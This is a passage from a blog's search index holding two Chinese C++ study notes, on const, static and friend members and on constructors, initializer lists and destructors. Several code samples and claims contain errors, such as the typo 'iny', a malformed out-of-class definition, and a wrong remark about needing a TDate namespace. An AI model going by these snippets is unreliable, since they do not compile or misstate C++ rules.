<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++中的类: const, static和友元</title>
      <link href="/post/b7907ed7.html"/>
      <url>/post/b7907ed7.html</url>
      
        <content type="html"><![CDATA[<h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><h3 id="const成员函数"><a href="#const成员函数" class="headerlink" title="const成员函数"></a>const成员函数</h3><p>要点：</p><ul><li>成员函数都有一个隐含参数<code>this</code>。</li><li>对于非<code>const</code>成员函数，<code>this</code>的类型是<code>A* const</code>: 指针是<code>const</code>(不能改指针本身)，但指向的对象可被修改。</li><li>对于<code>const</code>成员函数(在函数名后写了<code>const</code>)，<code>this</code>的类型是<code>const A* const</code>: 指针不可变且指向<code>const A</code>，表示不能修改对象的非<code>mutable</code>成员。</li><li>成员函数后加<code>const</code>表示“承诺不修改对象的可观察状态”。对应的隐含<code>this</code>类型是<code>const A* const</code>(指针不可改且指向<code>const</code>对象)。<br>有时在查询函数中希望做惰性计算&#x2F;缓存(例如计算 Fibonacci 并缓存结果)，这属于“内部实现细节”，从外部观察对象状态并不改变。<br>为了在<code>const</code>函数内仍能修改这些内部缓存，使用<code>mutable</code>修饰成员。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; x = <span class="number">1</span>; &#125; <span class="comment">// 等价为void f(A* const this); 如果函数体内写this = nullptr; 编译错误，this是const指针 </span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> <span class="type">const</span> </span>&#123;&#125; <span class="comment">// 等价为void show(const A* const this); 如果函数体内写x = 2; 编译错误，this指向const A  </span></span><br><span class="line">    <span class="keyword">mutable</span> <span class="type">int</span> m; </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show2</span><span class="params">()</span> <span class="type">const</span> </span>&#123; m = <span class="number">3</span>; &#125; <span class="comment">// 合法，mutable成员可在const函数中修改 </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">int</span>  &amp;r;        <span class="comment">// 非 const 引用</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> &amp;cr;  <span class="comment">// const 引用</span></span><br><span class="line">    <span class="keyword">mutable</span> <span class="type">int</span> m;  <span class="comment">// 可在 const 函数中修改</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        r++; <span class="comment">// 合法：修改r所指的对象(this未改变r本身)</span></span><br><span class="line">        cr++; <span class="comment">// 错误：cr是const int&amp;，不能修改被指对象</span></span><br><span class="line">        m++; <span class="comment">// 合法：mutable成员可改</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="constant-expression"><a href="#constant-expression" class="headerlink" title="constant expression"></a>constant expression</h3><p>常量表达式是在编译期即可计算出结果的表达式：</p><ul><li><p>把计算前移到编译期程序运行得更快且错误也能够更早被发现。</p></li><li><p><code>constexpr</code>：允许在编译期求值的函数或变量(也能在运行期使用)。如果上下文要求常量表达式，编译器会在编译期求值。</p></li><li><p><code>consteval</code>(C++20)：强制立即函数，只能出现在函数声明上，调用时必须在编译期求值；如果调用点不是常量表达式会报错。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// constexpr：可编译期求值，也可运行期调用</span></span><br><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="type">int</span> <span class="title">sq</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123; <span class="keyword">return</span> x * x; &#125;</span><br><span class="line"><span class="type">int</span> a[<span class="built_in">sq</span>(<span class="number">3</span>)]; <span class="comment">// 编译期求值 -&gt; a[9]</span></span><br><span class="line"><span class="type">int</span> n = <span class="number">4</span>;</span><br><span class="line"><span class="type">int</span> v = <span class="built_in">sq</span>(n); <span class="comment">// 运行期求值（n 只有运行期才知道）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// consteval (C++20)：必须在编译期求值</span></span><br><span class="line"><span class="function"><span class="keyword">consteval</span> <span class="type">int</span> <span class="title">two</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span>; &#125;</span><br><span class="line"><span class="type">int</span> b = <span class="built_in">two</span>(); <span class="comment">// 必须是编译期求值</span></span><br></pre></td></tr></table></figure></li><li><p>适用场景：数组大小、非类型模板实参、<code>switch</code>的<code>case</code>标签、查表&#x2F;位运算等需要编译期常量的地方。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Flags</span> &#123; GOOD=<span class="number">0</span>, FAIL=<span class="number">1</span>, BAD=<span class="number">2</span>, EOF=<span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">int</span> <span class="keyword">operator</span>|(Flags a, Flags b); <span class="comment">// 在这个表达式前面加上constexpr就可以通过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者用 constexpr 辅助函数：</span></span><br><span class="line"><span class="comment">// constexpr int bad_c() &#123; return int(BAD); &#125;</span></span><br><span class="line"><span class="comment">// constexpr int eof_c() &#123; return int(EOF_); &#125;</span></span><br><span class="line"><span class="comment">// constexpr int be_c() &#123; return bad_c() | eof_c(); &#125;</span></span><br><span class="line"><span class="comment">// case be_c(): // 合法</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(Flags x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(x) &#123;</span><br><span class="line">        <span class="keyword">case</span> BAD: <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EOF: <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BAD | EOF: <span class="comment">// 可能报错：不是编译期整常量</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>静态成员是属于类本身的成员(类级别)，不是某个对象的成员。<br>同一类的所有对象共享同一份静态数据(只有一份拷贝)。<br>当需要不同对象共享一个变量时，不用把它做全局变量(否则缺乏封装并产生命名污染)。</p><h3 id="static成员变量"><a href="#static成员变量" class="headerlink" title="static成员变量"></a>static成员变量</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> shared;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> A::shared = <span class="number">0</span>;</span><br><span class="line">A a,b;</span><br></pre></td></tr></table></figure><ul><li>同一类的所有对象共享同一份静态数据(只有一份拷贝)。</li><li>声明与定义：<ul><li>在类内声明：<code>static int shared</code>。</li><li>在类外定义并初始化(非 inline 情况)：<code>int A::shared = 0</code>。</li><li>C++17起可用<code>inline</code>初始化：<code>inline static int shared = 0</code>(不需类外定义)。</li></ul></li></ul><h3 id="static成员函数"><a href="#static成员函数" class="headerlink" title="static成员函数"></a>static成员函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> shared;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;&#125; <span class="comment">// 只能访问shared</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">q</span><span class="params">()</span> </span>&#123;&#125; <span class="comment">// x和shared都可以访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>static函数没有隐含的<code>this</code>指针，因此不能访问非静态成员(实例成员x)或<code>this</code>。</li><li>静态函数可以访问和修改静态成员变量(类级别的共享数据)。</li><li>遵循类访问控制</li></ul><h3 id="static成员的使用"><a href="#static成员的使用" class="headerlink" title="static成员的使用"></a>static成员的使用</h3><p>因为C++是支持观点”类也是对象”的，所以可以通过<code>A::f()</code>或<code>obj.f()</code>(推荐用第一种方式访问)。这也是拷贝构造函数和移动构造函数的基础。</p><p>示例(单例模式的实现)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">singleton</span> &#123;</span><br><span class="line">    <span class="built_in">singleton</span>() = <span class="keyword">default</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">singleton</span>(<span class="type">const</span> singleton&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    singleton&amp; <span class="keyword">operator</span>=(<span class="type">const</span> singleton&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> singleton&amp; <span class="title">instance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">static</span> singleton inst; </span><br><span class="line">        <span class="keyword">return</span> inst;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">singleton&amp; s = singleton::<span class="built_in">instance</span>();</span><br></pre></td></tr></table></figure><h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><p>因为类的访问控制规定了类的外部不能访问该类的<code>private</code>成员，只能通过该类提供的<code>public</code>方法当作接口来访问私有成员，但是这会降低对私有成员的访问效率并且缺乏灵活性。</p><p>为了解决上述的问题提出了友元：</p><ul><li>分类：<ul><li>友元函数</li><li>友元类</li><li>友元类成员函数</li></ul></li><li>作用：<ul><li>允许外部函数&#x2F;类访问本类的<code>private/protected</code>成员(绕过普通访问控制)。</li><li>提高设计灵活性，常用于实现高效的操作&#x2F;接口。</li><li>在“数据保护”和“访问效率”之间提供一种折中方案：既能保持封装界面，又能避免过多的访问器函数开销。</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span>; <span class="comment">// 友元函数</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">B</span>; <span class="comment">// 友元类</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">C::f</span><span class="params">()</span></span>; <span class="comment">// 友元成员函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>友元不具传递性：A把f声明为友元并不自动让f成为B的友元；要访问B的私有成员，必须也在B中声明f为友元。</li><li>友元不继承：派生类不会继承基类给某函数的友元资格。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前向声明</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Matrix</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">multiply</span><span class="params">(Matrix&amp; m, Vector&amp; v, Vector&amp; r)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Matrix</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">multiply</span><span class="params">(Matrix&amp;, Vector&amp;, Vector&amp;)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span> &#123;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">multiply</span><span class="params">(Matrix&amp;, Vector&amp;, Vector&amp;)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">multiply</span><span class="params">(Matrix&amp; m, Vector&amp; v, Vector&amp; r)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以访问 m.a 和 v.b 等私有成员</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向声明尽管在某些条件下是可以省略的，但可能会出现命名污染等问题，所以在使用友元时一定要保证友元在此之前已被恰当声明。</p>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> OO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++中的类: 构造与析构</title>
      <link href="/post/5f1aae27.html"/>
      <url>/post/5f1aae27.html</url>
      
        <content type="html"><![CDATA[<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>类的定义如下，以简单的<code>TDate</code>为例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TDate</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">SetDate</span><span class="params">(iny y, <span class="type">int</span> m, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">        year = y; month = m; day = d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">IsLeapYear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) ||</span><br><span class="line">         (year % <span class="number">400</span> == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> year, month, day;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在类中定义且实现了的函数(<code>SetDate()</code>, <code>IsLeapYear()</code>)编译器会自动内联，即隐式内联。</li><li>不能在类中直接像<code>int year = 2000</code>这样初始化函数(C++11前，之后可以对非静态成员这样进行初始化)，需要定义构造函数来进行初始化: <code>TDate() : year(2000) &#123;&#125;</code>。</li></ul><p>如果要实现ADT的话(头文件 &#x2F; 源文件分离)，实现如下：</p><p>在<code>a.h</code>中定义类：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TDate</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">SetDate</span><span class="params">(iny y, <span class="type">int</span> m, <span class="type">int</span> d)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">IsLeapYear</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> year, month, day;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>a.cpp</code>中实现函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">TDate::SetDate</span><span class="params">(iny y, <span class="type">int</span> m, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    year = y; month = m; day = d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> TDate::<span class="type">int</span> <span class="title">IsLeapYear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) ||</span><br><span class="line">     (year % <span class="number">400</span> == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>因为函数只是声明在<code>.h</code>，具体实现放在<code>.cpp</code>，编译器在编译使用处看不到函数体，通常不能在编译期内联(所以不会被内联)。</li><li>重要的是需要声明命名空间(<code>namespace</code>)为<code>TDate</code>。</li></ul><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>构造函数用于对象的初始化，主要特点：与类同名且无返回类型；自动调用但不可直接调用；可重载。</p><h3 id="默认构造函数"><a href="#默认构造函数" class="headerlink" title="默认构造函数"></a>默认构造函数</h3><p>编译器只有在类没有“用户声明的构造函数”(即你没写任何构造函数)的情况下才会隐式声明一个默认构造函数(default constructor)。<br>即便被隐式声明了，若类的某个基类或非静态成员没有可用的默认构造函数(或是引用<code>const</code>成员无初始值等)，该默认构造函数会被定义为deleted(不可用)。</p><p>例子如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有隐式默认构造</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">A</span> &#123; <span class="type">int</span> x; &#125;; <span class="comment">// A() 可用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有用户构造后，隐式默认构造不再生成</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">B</span> &#123; <span class="built_in">B</span>(<span class="type">int</span>); &#125;; <span class="comment">// B() 不存在</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 成员类型无默认构造 -&gt; 隐式默认构造被删除</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">C</span> &#123; B b; &#125;; <span class="comment">// C() 被删除，因为 B 没有默认构造</span></span><br><span class="line"><span class="comment">// 解决办法：给B提供默认构造或者显示初始化b</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">B</span> &#123; <span class="built_in">B</span>() = <span class="keyword">default</span>; <span class="built_in">B</span>(<span class="type">int</span>)&#123;&#125; &#125;; <span class="comment">// 给B提供默认构造</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">C</span> &#123; B b; <span class="built_in">C</span>(): <span class="built_in">b</span>(<span class="number">42</span>) &#123;&#125; &#125;; <span class="comment">// 显式初始化b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用/const 成员无初始值 -&gt; 默认构造被删除</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">D</span> &#123; <span class="type">const</span> <span class="type">int</span> v; &#125;; <span class="comment">// D() 被删除</span></span><br><span class="line"><span class="comment">// 解决办法：提供成员默认值或显式默认构造</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">D2</span> &#123; <span class="type">const</span> <span class="type">int</span> v = <span class="number">0</span>; &#125;; <span class="comment">// D2() 可用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">E</span> &#123; B b; <span class="built_in">E</span>() = <span class="keyword">delete</span>; &#125;; <span class="comment">// 手动禁止</span></span><br></pre></td></tr></table></figure><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>(<span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A a1 = <span class="built_in">A</span>(<span class="number">1</span>); &lt;=&gt; A <span class="built_in">a1</span>(<span class="number">1</span>); &lt;=&gt; A a1 = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="成员初始化表"><a href="#成员初始化表" class="headerlink" title="成员初始化表"></a>成员初始化表</h3><ul><li>成员初始化表是构造函数的补充，当成员是<code>const</code>、引用(<code>T&amp;</code>)、或类型没有默认构造(只有带参构造)，以及需要用特定构造函数初始化的成员对象；这些必须用初始化表初始化，否则编译错误。同时，初始化表直接调用成员的构造函数(直接初始化)；在构造函数体内赋值则是先调用默认构造再赋值(多一步、可能不可行)，能够减轻compiler的负担。</li><li>执行顺序：优先于构造函数体，按类数据成员申明次序来进行：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> y;</span><br><span class="line">    <span class="type">int</span> &amp;z;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>() : <span class="built_in">y</span>(<span class="number">1</span>), <span class="built_in">z</span>(x), <span class="built_in">x</span>(<span class="number">0</span>) &#123;x = <span class="number">100</span>;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>虽然z写在x前面进行初始化，但是因为x先声明所以不会报错；如果y在函数体内初始化会报错但是在初始化表里不会报错；x的值最后等于100。</li></ul><h3 id="成员初始化"><a href="#成员初始化" class="headerlink" title="成员初始化"></a>成员初始化</h3><ul><li>就地成员初值：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">S</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">S</span>() : <span class="built_in">x</span>(<span class="number">42</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>x最后会被赋值为42(初始化表优先级更高会覆盖默认值)。</li><li>统一初始化(Uniform initialization)：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x&#123;<span class="number">0</span>&#125;; <span class="comment">// 标量</span></span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; v&#123;<span class="number">1</span>, <span class="number">2</span>&#125;; <span class="comment">// 容器</span></span><br><span class="line">S s&#123;<span class="number">1</span>, <span class="string">&quot;abc&quot;</span>&#125;; <span class="comment">// 聚合或匹配构造</span></span><br></pre></td></tr></table></figure>虽然使用花括号能够统一初始化的风格，但是和&#x3D;以及()进行赋值也是有差别的，第一个就是窄化检查：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">3.14</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">(d)</span></span>; <span class="comment">// 静默截断</span></span><br><span class="line"><span class="type">int</span> b = d; <span class="comment">// 静默截断</span></span><br><span class="line"><span class="type">int</span> c&#123;d&#125;; <span class="comment">// 报错：窄化</span></span><br></pre></td></tr></table></figure>第二个就是对于定义了 <code>std::initializer_list</code> 构造函数的类，用花括号 <code>&#123;&#125;</code> 初始化时会优先匹配这个构造函数：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="built_in">B</span>(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">B</span>(std::initializer_list&lt;<span class="type">int</span>&gt;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">B b1&#123;<span class="number">1</span>, <span class="number">2</span>&#125;; <span class="comment">// 调用 B(std::initializer_list&lt;int&gt;)</span></span><br><span class="line"><span class="function">B <span class="title">b2</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span></span>; <span class="comment">// 调用 B(int, int)</span></span><br></pre></td></tr></table></figure></li></ul><p>一般来说，<code>const</code> &#x2F; 引用 &#x2F; 没有默认构造的成员 &#x2F; 基类构造必须使用成员初始化表；推荐复杂成员(<code>string</code>, <code>vector</code>, 自己的类)使用初始化表因为更高效；希望防窄化、更统一风格时使用花括号：<code>int x&#123;0&#125;;</code>、<code>S s&#123;arg1, arg2&#125;</code>；对有自然默认值的成员推荐使用就地成员默认值。</p><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>析构函数释放对象持有的资源(堆内存资源、文件句柄、锁、<code>socket</code>等)，以及配合<code>new/delete</code>管理堆内存。</p><ul><li>定义方式：<code>~&lt;类名&gt;()</code>：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span>* str;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>() : <span class="built_in">str</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    ~<span class="built_in">A</span>() &#123; <span class="keyword">delete</span>[] str; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>对象生命周期结束时(栈对象离开作用域，或对堆对象执行<code>delete</code>等)，系统都会自动调用该对象的析构函数；栈对象的结束时机由作用域决定，堆对象的结束时机由程序员负责调用<code>delete</code>或使用智能指针(<code>unique_ptr</code>)控制。</li></ul><h3 id="GC与RAII"><a href="#GC与RAII" class="headerlink" title="GC与RAII"></a>GC与RAII</h3><h4 